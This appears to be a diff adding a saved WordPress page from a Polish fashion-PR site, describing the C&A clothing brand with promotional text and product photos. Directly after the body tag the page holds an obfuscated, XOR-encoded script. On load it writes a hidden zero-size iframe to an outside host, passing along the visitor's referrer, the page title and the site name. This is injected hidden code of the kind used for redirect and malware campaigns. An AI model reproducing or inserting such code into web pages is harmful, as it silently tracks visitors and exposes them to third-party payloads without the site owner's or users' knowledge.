@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="pl-PL">
+<head>
+  <meta charset="UTF-8" />
+
+  <!-- Set the viewport width to device width for mobile -->
+  <meta name="viewport" content="width=device-width" />
+  <meta name="generator" content="WordPress 4.7.9" />
+  <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="http://www.prproduktowy.net.pl/feed/" />
+  <link rel="pingback" href="http://www.prproduktowy.net.pl/xmlrpc.php" /> 
+  <link rel="shortcut icon" href="" />
+  <title>C&#038;A &#8211; PRproduktowy.net.pl</title>
+   <link rel="profile" href="http://gmpg.org/xfn/11" />
+   <link rel="pingback" href="http://www.prproduktowy.net.pl/xmlrpc.php" /> 
+
+    <!-- GOOGLE WEB FONTS -->
+   <link href='http://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700,300italic,400italic,700italic' rel='stylesheet' type='text/css'>
+   <link href='http://fonts.googleapis.com/css?family=Vidaloka' rel='stylesheet' type='text/css'>
+  
+  <!-- IE Fix for HTML5 Tags -->
+  <!--[if lt IE 9]>
+    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+  <![endif]-->
+
+
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="PRproduktowy.net.pl &raquo; Kanał z wpisami" href="http://www.prproduktowy.net.pl/feed/" />
+<link rel="alternate" type="application/rss+xml" title="PRproduktowy.net.pl &raquo; Kanał z komentarzami" href="http://www.prproduktowy.net.pl/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="PRproduktowy.net.pl &raquo; C&#038;A Kanał z komentarzami" href="http://www.prproduktowy.net.pl/ca/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/www.prproduktowy.net.pl\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.9"}};
+			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='fancybox-css'  href='http://www.prproduktowy.net.pl/wp-content/themes/quarter/javascripts/source/jquery.fancybox.css?ver=4.7.9' type='text/css' media='all' />
+<link rel='stylesheet' id='foundation-css'  href='http://www.prproduktowy.net.pl/wp-content/themes/quarter/stylesheets/foundation.css?ver=4.7.9' type='text/css' media='all' />
+<link rel='stylesheet' id='aude-layout-css'  href='http://www.prproduktowy.net.pl/wp-content/themes/quarter/style.css?ver=4.7.9' type='text/css' media='all' />
+<link rel='stylesheet' id='superfishcss-css'  href='http://www.prproduktowy.net.pl/wp-content/themes/quarter/stylesheets/superfish.css?ver=4.7.9' type='text/css' media='all' />
+<link rel='stylesheet' id='flexslider-css'  href='http://www.prproduktowy.net.pl/wp-content/themes/quarter/stylesheets/flexslider.css?ver=4.7.9' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.prproduktowy.net.pl/wp-content/themes/quarter/javascripts/modernizr.foundation.js?ver=4.7.9'></script>
+<script type='text/javascript' src='http://www.prproduktowy.net.pl/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
+<script type='text/javascript' src='http://www.prproduktowy.net.pl/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<link rel='https://api.w.org/' href='http://www.prproduktowy.net.pl/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.prproduktowy.net.pl/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.prproduktowy.net.pl/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 4.7.9" />
+<link rel="canonical" href="http://www.prproduktowy.net.pl/ca/" />
+<link rel='shortlink' href='http://www.prproduktowy.net.pl/?p=30' />
+<link rel="alternate" type="application/json+oembed" href="http://www.prproduktowy.net.pl/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.prproduktowy.net.pl%2Fca%2F" />
+<link rel="alternate" type="text/xml+oembed" href="http://www.prproduktowy.net.pl/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.prproduktowy.net.pl%2Fca%2F&#038;format=xml" />
+		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+		
+</head>
+<body class="page-template-default page page-id-30">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+
+<!-- Top Bar -->
+  <div class="top">
+    <div class="row">
+     <div class="ten columns">
+      <ul class="social">
+            	        	                                            	        </ul>
+    </div>
+
+    <div class="two columns">
+      <div class="row">
+      <div class="eleven columns">  
+     <!-- SEARCH -->
+   <form method="get" id="searchform" action="http://www.prproduktowy.net.pl">
+   <div class="row collapse">  
+   <div class="ten mobile-three columns">
+   <input type="text" name="s" id="s" value=""> 
+   </div>
+   <div class="two mobile-one columns">
+   <button type="submit" class="button tiny">Search</button>    
+   </div>
+   </div>
+   </form>
+<!-- SEARCH END -->   </div>
+ </div>
+  </div>
+
+</div>
+</div>
+
+  <!-- End Top Bar -->
+
+
+ <!-- Header -->
+
+    <div class="row">
+    <div class="twelve columns">
+     <a href="http://www.prproduktowy.net.pl/">
+     <h1 class="text-center logo">
+         PRproduktowy.net.pl        </h1></a>
+     
+     <p class="text-center motto"></p>
+     
+    </div>
+  </div>
+  <!-- End Header -->
+
+
+  <!-- NAVIGATION -->
+    <div class="row">
+    <div class="twelve columns"> 
+ <nav>
+     <ul id="themenu" class="sf-menu navigation"><li id="menu-item-61" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-61"><a href="http://www.prproduktowy.net.pl/">Skuteczny Fashion Marketing</a></li>
+<li id="menu-item-54" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-54"><a href="http://www.prproduktowy.net.pl/czym-jest-fashion-pr/">Czym jest Fashion PR?</a></li>
+<li id="menu-item-59" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-59"><a href="http://www.prproduktowy.net.pl/pr-produktowy-warty-wiekszej-uwagi/">PR Produktowy &#8211; warty większej uwagi</a></li>
+<li id="menu-item-60" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-60"><a href="http://www.prproduktowy.net.pl/showroomy-promocja-mody/">Showroomy &#8211; promocja mody</a></li>
+<li id="menu-item-62" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-62"><a href="#">Marki:</a>
+<ul class="sub-menu">
+	<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="http://www.prproduktowy.net.pl/baldowski/">Baldowski</a></li>
+	<li id="menu-item-51" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-51"><a href="http://www.prproduktowy.net.pl/butik/">Butik</a></li>
+	<li id="menu-item-53" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-53"><a href="http://www.prproduktowy.net.pl/carry/">Carry</a></li>
+	<li id="menu-item-52" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-30 current_page_item menu-item-52"><a href="http://www.prproduktowy.net.pl/ca/">C&#038;A</a></li>
+	<li id="menu-item-55" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-55"><a href="http://www.prproduktowy.net.pl/denim-box/">Denim Box</a></li>
+	<li id="menu-item-56" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-56"><a href="http://www.prproduktowy.net.pl/eobuwie-pl/">Eobuwie.pl</a></li>
+	<li id="menu-item-57" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-57"><a href="http://www.prproduktowy.net.pl/est-by-es/">Est by Es</a></li>
+	<li id="menu-item-58" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-58"><a href="http://www.prproduktowy.net.pl/evc-dsgn/">EVC DSGN</a></li>
+	<li id="menu-item-71" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-71"><a href="http://www.prproduktowy.net.pl/forever-pink/">Forever Pink</a></li>
+	<li id="menu-item-72" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-72"><a href="http://www.prproduktowy.net.pl/marco-tozzi/">Marco Tozzi</a></li>
+	<li id="menu-item-73" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-73"><a href="http://www.prproduktowy.net.pl/moodo/">Moodo</a></li>
+	<li id="menu-item-74" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-74"><a href="http://www.prproduktowy.net.pl/mumco/">Mum&#038;Co</a></li>
+	<li id="menu-item-92" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-92"><a href="http://www.prproduktowy.net.pl/tamaris/">Tamaris</a></li>
+	<li id="menu-item-93" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-93"><a href="http://www.prproduktowy.net.pl/taranko/">Taranko</a></li>
+	<li id="menu-item-94" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-94"><a href="http://www.prproduktowy.net.pl/yvon/">Yvon</a></li>
+	<li id="menu-item-95" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-95"><a href="http://www.prproduktowy.net.pl/zielony-kot/">Zielony Kot</a></li>
+</ul>
+</li>
+</ul>
+
+ <!-- DROPDOWN SELECT MENU FOR SMALL SCREENS -->      
+  <div class="medium button dropdown">
+  Select
+   <ul>
+<li><a href="http://www.prproduktowy.net.pl/">Skuteczny Fashion Marketing</a></li>
+<li><a href="http://www.prproduktowy.net.pl/czym-jest-fashion-pr/">Czym jest Fashion PR?</a></li>
+<li><a href="http://www.prproduktowy.net.pl/pr-produktowy-warty-wiekszej-uwagi/">PR Produktowy &#8211; warty większej uwagi</a></li>
+<li><a href="http://www.prproduktowy.net.pl/showroomy-promocja-mody/">Showroomy &#8211; promocja mody</a></li>
+<li><a href="#">Marki:</a></li>
+<li><a href="http://www.prproduktowy.net.pl/baldowski/">- Baldowski</a></li>
+<li><a href="http://www.prproduktowy.net.pl/butik/">- Butik</a></li>
+<li><a href="http://www.prproduktowy.net.pl/carry/">- Carry</a></li>
+<li><a href="http://www.prproduktowy.net.pl/ca/">- C&#038;A</a></li>
+<li><a href="http://www.prproduktowy.net.pl/denim-box/">- Denim Box</a></li>
+<li><a href="http://www.prproduktowy.net.pl/eobuwie-pl/">- Eobuwie.pl</a></li>
+<li><a href="http://www.prproduktowy.net.pl/est-by-es/">- Est by Es</a></li>
+<li><a href="http://www.prproduktowy.net.pl/evc-dsgn/">- EVC DSGN</a></li>
+<li><a href="http://www.prproduktowy.net.pl/forever-pink/">- Forever Pink</a></li>
+<li><a href="http://www.prproduktowy.net.pl/marco-tozzi/">- Marco Tozzi</a></li>
+<li><a href="http://www.prproduktowy.net.pl/moodo/">- Moodo</a></li>
+<li><a href="http://www.prproduktowy.net.pl/mumco/">- Mum&#038;Co</a></li>
+<li><a href="http://www.prproduktowy.net.pl/tamaris/">- Tamaris</a></li>
+<li><a href="http://www.prproduktowy.net.pl/taranko/">- Taranko</a></li>
+<li><a href="http://www.prproduktowy.net.pl/yvon/">- Yvon</a></li>
+<li><a href="http://www.prproduktowy.net.pl/zielony-kot/">- Zielony Kot</a></li>
+ </ul>
+</div>
+ <!-- END OF DROPDOWN SELECT MENU FOR SMALL SCREENS --> 
+ </nav>
+</div>
+</div>
+
+<!-- END OF NAVIGATION --> 
+<div class="row">
+
+<div class="nine columns">
+
+ <!-- POSTS LOOP -->
+ 
+<div class="row"> 
+<div class="twelve columns">
+
+<article> 
+<div class="post-30 page type-page status-publish hentry">
+<h2 class="post_title"><span>C&#038;A</span></h2> 
+   
+<p><em>Dewizą marki C&amp;A jest zadowolenie klienta oraz taki wybór asortymentu dostępnego do sprzedaży, zarówno w sklepach stacjonarnych, jak i w sklepach online, by każdy mógł znaleźć tam ubrania odpowiednie dla siebie, na każdą okazję. Firma otworzyła swój pierwszy sklep w Holandii w 1911 roku, będąc marką, która zaskarbiła sobie od razu sympatię klientów – niskimi cenami przy bardzo wysokiej jakości ubrań. Z roku na rok sklepów pod szyldem C&amp;A przybywało w Europie i na świecie, i obecnie jest to jedna z najbardziej rozpoznawalnych sieciówek.</em></p>
+<p>C&amp;A to aż jedenaście różnych marek, przeznaczonych dla konkretnych odbiorców. To także wygodnie podzielone, przestronne sklepy, w których bezbłędnie można skierować się od razu do działu z odzieżą damską, męską, niemowlęca czy dziecięcą. Ubrania C&amp;A to także jedne z pierwszych, które wykonuje się ze specjalnej biobawełny – uprawianej na ekologicznych polach bez używania pestycydów, pozyskując w ten sposób naturalny, przyjemny dla skóry i zdrowy dla środowiska surowiec do tworzenia fantastycznych koszulek czy spodni. Co ciekawe, ekologiczne ubrania są nieco tańsze od tych pozostałych z innych kolekcji, może warto więc pomyśleć o zmianie stylu życia na zdrowszy, i do tego bardziej ekonomiczny, właśnie dzięki C&amp;A?</p>
+<p>C&amp;A stawia przede wszystkim na wygodę i bardzo wysoką jakość sprzedawanych produktów. Są one doskonale skrojone, świetnie uszyte, i wykonane z materiałów najwyższej jakości. W sklepach stacjonarnych i online można je kupić w atrakcyjnych wyprzedażach w cenie dużo niższej, niż pierwotna.</p>
+<p>Powiązane: C&amp;A, C and a, C&amp;A sklep, <strong>C&amp;A online</strong>, C&amp;A sklep internetowy, C&amp;A Warszawa, C&amp;A Kolekcja, C&amp;A Poznań, C&amp;A Kraków</p>
+<p><a href="http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-bielizna.jpg"><img class="alignnone  wp-image-109" src="http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-bielizna-300x300.jpg" alt="Bielizna C&amp;A" width="228" height="228" srcset="http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-bielizna-300x300.jpg 300w, http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-bielizna-150x150.jpg 150w, http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-bielizna.jpg 350w" sizes="(max-width: 228px) 100vw, 228px" /></a><a href="http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-koszula.jpg"><img class="alignnone  wp-image-110" src="http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-koszula-300x300.jpg" alt="Koszula C&amp;A" width="204" height="204" srcset="http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-koszula-300x300.jpg 300w, http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-koszula-150x150.jpg 150w, http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-koszula.jpg 350w" sizes="(max-width: 204px) 100vw, 204px" /></a> <a href="http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-spodnie.jpg"><img class="alignnone  wp-image-111" src="http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-spodnie-300x300.jpg" alt="Spodnie C&amp;A" width="180" height="180" srcset="http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-spodnie-300x300.jpg 300w, http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-spodnie-150x150.jpg 150w, http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-spodnie.jpg 350w" sizes="(max-width: 180px) 100vw, 180px" /></a> <a href="http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-sweter.jpg"><img class="alignnone  wp-image-112" src="http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-sweter-300x300.jpg" alt="Sweter C&amp;A" width="187" height="187" srcset="http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-sweter-300x300.jpg 300w, http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-sweter-150x150.jpg 150w, http://www.prproduktowy.net.pl/wp-content/uploads/2014/05/c-a-sweter.jpg 350w" sizes="(max-width: 187px) 100vw, 187px" /></a></p>
+ </div> 
+</article>
+
+</div>
+        
+</div>  
+ 
+<!-- POSTS LOOP END --> 
+
+</div>  
+
+<!-- SIDEBAR -->
+<div class="three columns">
+   
+    		
+        
+</div>
+</div>
+
+</div>
+
+<!-- Footer -->
+
+  <footer class="row">
+    <div class="twelve columns">
+      <hr />
+      <div class="row">
+        <div class="twelve columns">
+          <p class="text-center"></p>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <script type='text/javascript' src='http://www.prproduktowy.net.pl/wp-content/themes/quarter/javascripts/foundation.min.js?ver=4.7.9'></script>
+<script type='text/javascript' src='http://www.prproduktowy.net.pl/wp-includes/js/hoverIntent.min.js?ver=1.8.1'></script>
+<script type='text/javascript' src='http://www.prproduktowy.net.pl/wp-content/themes/quarter/javascripts/superfish.js?ver=4.7.9'></script>
+<script type='text/javascript' src='http://www.prproduktowy.net.pl/wp-content/themes/quarter/javascripts/jquery.flexslider.js?ver=4.7.9'></script>
+<script type='text/javascript' src='http://www.prproduktowy.net.pl/wp-content/themes/quarter/javascripts/source/jquery.fancybox.js?ver=4.7.9'></script>
+<script type='text/javascript' src='http://www.prproduktowy.net.pl/wp-content/themes/quarter/javascripts/source/helpers/jquery.fancybox-media.js?ver=4.7.9'></script>
+<script type='text/javascript' src='http://www.prproduktowy.net.pl/wp-content/themes/quarter/javascripts/app.js?ver=4.7.9'></script>
+<script type='text/javascript' src='http://www.prproduktowy.net.pl/wp-content/themes/quarter/javascripts/jquery.foundation.buttons.js?ver=4.7.9'></script>
+<script type='text/javascript' src='http://www.prproduktowy.net.pl/wp-includes/js/comment-reply.min.js?ver=4.7.9'></script>
+<script type='text/javascript' src='http://www.prproduktowy.net.pl/wp-includes/js/wp-embed.min.js?ver=4.7.9'></script>
+</body>
+</html>
+
+  <!-- End Footer -->
